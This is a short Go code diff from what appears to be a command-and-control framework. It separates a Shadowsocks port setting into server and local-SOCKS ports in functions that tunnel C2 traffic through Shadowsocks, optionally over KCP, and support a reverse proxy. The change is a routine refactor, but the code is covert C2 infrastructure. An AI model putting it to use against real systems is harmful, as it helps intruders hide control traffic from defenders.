@@ -45,7 +45,7 @@ func createSSConfig(serverAddr, localSocksAddr, tcptun string, isServer bool) *s
 // Start ShadowsocksC2Client client, you get a SOCKS5 proxy server at 127.0.0.1:Runtime.ShadowsocksPort
 // This proxy server is responsible for encapsulating C2 traffic
 func ShadowsocksC2Client() {
-	ss_server_port := RuntimeConfig.ShadowsocksPort
+	ss_server_port := RuntimeConfig.ShadowsocksServerPort
 	ss_server_addr := RuntimeConfig.CCHost
 	if RuntimeConfig.UseKCP {
 		log.Print("C2 traffic will go through Shadowsocks, which will go through KCP")
@@ -54,11 +54,11 @@ func ShadowsocksC2Client() {
 	} else {
 		log.Printf("C2 traffic will go through Shadowsocks: %s:%s",
 			RuntimeConfig.CCHost,
-			RuntimeConfig.ShadowsocksPort)
+			RuntimeConfig.ShadowsocksServerPort)
 	}
 
 	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
-	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksPort
+	local_socks_addr := "127.0.0.1:" + RuntimeConfig.ShadowsocksLocalSocksPort
 
 	startShadowsocksClient(server_addr, local_socks_addr, "")
 }
@@ -66,7 +66,7 @@ func ShadowsocksC2Client() {
 // Start ShadowsocksTCPTunnel to connect to Shadowsocks server and forward traffic to a specified remote address
 // tcptun: "local_port=remote_host:remote_port,local_port=remote_host:remote_port"
 func ShadowsocksTCPTunnel(lport, raddr string) {
-	ss_server_port := RuntimeConfig.ShadowsocksPort
+	ss_server_port := RuntimeConfig.ShadowsocksServerPort
 	ss_server_addr := RuntimeConfig.CCHost
 
 	server_addr := fmt.Sprintf("%s:%s", ss_server_addr, ss_server_port)
@@ -80,7 +80,7 @@ func ShadowsocksTCPTunnel(lport, raddr string) {
 // for both broadcasted proxy server and `bring2cc` SSH reverse proxy
 func ShadowsocksServer() error {
 	ctx, cancel := context.WithCancel(context.Background())
-	ss_config := createSSConfig("0.0.0.0:"+RuntimeConfig.ShadowsocksPort, "", "", true)
+	ss_config := createSSConfig("0.0.0.0:"+RuntimeConfig.ShadowsocksServerPort, "", "", true)
 	ss_config.Ctx = ctx
 	ss_config.Cancel = cancel
 
